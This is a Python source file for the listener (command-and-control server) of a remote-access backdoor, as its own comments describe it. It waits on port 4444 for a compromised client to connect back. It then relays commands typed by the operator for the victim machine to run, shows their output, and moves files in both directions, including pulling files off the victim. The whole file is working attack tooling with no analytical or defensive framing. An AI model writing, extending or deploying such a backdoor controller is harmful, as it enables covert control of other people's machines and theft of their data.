import socket
import json
import os

BUFFER_SIZE = 4096  # Set buffer size for file transfer

# This is the Listener (Server) that the Backdoor (Client) connects to
# python3 Server.py

# Commands from the Server:
# ls (list files)
# cd /path/to/directory (change directory)
# download filename (server sends file to client)
# upload (client selects file to send)
# exit (disconnects client)

class Server:
    def __init__(self, host="0.0.0.0", port=4444):
        self.host = host
        self.port = port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow socket reuse

    def start(self):
        """Start the server and accept client connections."""
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(1)
        print(f"[+] Waiting for incoming connections on {self.host}:{self.port}...")

        try:
            self.client_socket, self.address = self.server_socket.accept()
            print(f"[+] Connection established from {self.address}")

            self.handle_client()
        except Exception as e:
            print(f"[!] Server error: {e}")
        finally:
            self.cleanup()

    def send_data(self, data):
        """Send JSON data to the client."""
        try:
            serialized_data = json.dumps(data)
            self.client_socket.send(serialized_data.encode())
        except Exception as e:
            print(f"[!] Error sending data: {e}")

    def receive_data(self):
        """Receive JSON data from the client."""
        try:
            raw_data = self.client_socket.recv(BUFFER_SIZE).decode()
            return json.loads(raw_data)
        except json.JSONDecodeError:
            print("[!] Received invalid JSON format.")
            return {}
        except Exception as e:
            print(f"[!] Error receiving data: {e}")
            return {}

    def send_file(self, filename):
        """Send a file to the client in chunks."""
        try:
            if os.path.exists(filename):
                file_size = os.path.getsize(filename)
                self.send_data({"command": "download", "filename": filename, "size": file_size})

                with open(filename, "rb") as f:
                    while chunk := f.read(BUFFER_SIZE):
                        self.client_socket.send(chunk)

                print(f"[+] File '{filename}' sent successfully.")
            else:
                self.send_data({"command": "error", "message": "File not found."})
                print("[!] File not found.")
        except Exception as e:
            print(f"[!] Error sending file: {e}")

    def receive_file(self, filename):
        """Receive a file from the client in chunks."""
        try:
            self.send_data({"command": "upload", "filename": filename})
            response = self.receive_data()

            if "size" not in response:
                print("[!] Invalid response from client.")
                return

            file_size = response["size"]
            received_bytes = 0

            with open(filename, "wb") as f:
                while received_bytes < file_size:
                    chunk = self.client_socket.recv(BUFFER_SIZE)
                    if not chunk:
                        break
                    f.write(chunk)
                    received_bytes += len(chunk)

            print(f"[+] File '{filename}' received successfully.")
        except Exception as e:
            print(f"[!] Error receiving file: {e}")

    def handle_client(self):
        """Main loop for handling client commands."""
        try:
            while True:
                command = input(">> ")  # Read user input

                if command.lower() == "exit":
                    self.send_data({"command": "exit"})
                    break

                elif command.startswith("download "):  # Server sends a file to the client
                    filename = command.split(" ", 1)[1]
                    self.send_file(filename)

                elif command.startswith("upload "):  # Server requests a file from the client
                    filename = command.split(" ", 1)[1]
                    self.receive_file(filename)

                else:
                    self.send_data({"command": command})  # Send command to client
                    response = self.receive_data()
                    print(response.get("output", "No response"))

        except (ConnectionResetError, BrokenPipeError):
            print("[!] Client disconnected unexpectedly.")
        except Exception as e:
            print(f"[!] Unexpected error: {e}")
        finally:
            self.cleanup()

    def cleanup(self):
        """Close sockets properly to free the address."""
        try:
            self.client_socket.close()
            self.server_socket.close()
            print("[+] Server shut down.")
        except Exception as e:
            print(f"[!] Cleanup error: {e}")


if __name__ == "__main__":
    server = Server()
    server.start()
